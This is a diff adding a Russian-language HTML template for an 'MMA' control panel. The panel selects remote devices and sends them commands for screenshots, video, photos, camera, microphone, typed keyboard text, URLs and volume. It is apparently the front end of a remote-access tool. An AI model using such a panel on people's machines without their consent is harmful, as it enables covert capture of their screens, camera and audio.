@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>MMA - Панель управления</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="dashboard">
+        <h1>MMA - Панель управления</h1>
+        <form method="POST">
+            <h2>Устройства</h2>
+            {% for name in devices %}
+                <label><input type="checkbox" name="devices" value="{{ name }}">{{ name }}</label><br>
+            {% endfor %}
+            <h2>Команды</h2>
+            <button type="submit" name="action" value="browser">Браузер</button>
+            <button type="submit" name="action" value="link">Ссылка</button>
+            <input type="text" name="url" placeholder="Введите URL">
+            <button type="submit" name="action" value="screenshot">Скриншот</button>
+            <button type="submit" name="action" value="video">Видео</button>
+            <input type="number" name="seconds" max="60" placeholder="Секунд">
+            <button type="submit" name="action" value="photo">Фотка</button>
+            <button type="submit" name="action" value="algoritmika">Алгоритмика</button>
+            <button type="submit" name="action" value="keyboard">Клавиатура</button>
+            <input type="text" name="text" placeholder="Текст">
+            <button type="submit" name="action" value="camera">Камера</button>
+            <button type="submit" name="action" value="audio">Звук</button>
+            <input type="number" name="seconds" max="60" placeholder="Секунд">
+            <button type="submit" name="action" value="microphone">Микрофон</button>
+            <button type="submit" name="action" value="volume">Громкость</button>
+            <input type="number" name="level" min="0" max="100" placeholder="0-100">
+            <button type="submit" name="action" value="devices">Устройства</button>
+        </form>
+        <a href="/storage">Хранилище</a>
+    </div>
+</body>
+</html>
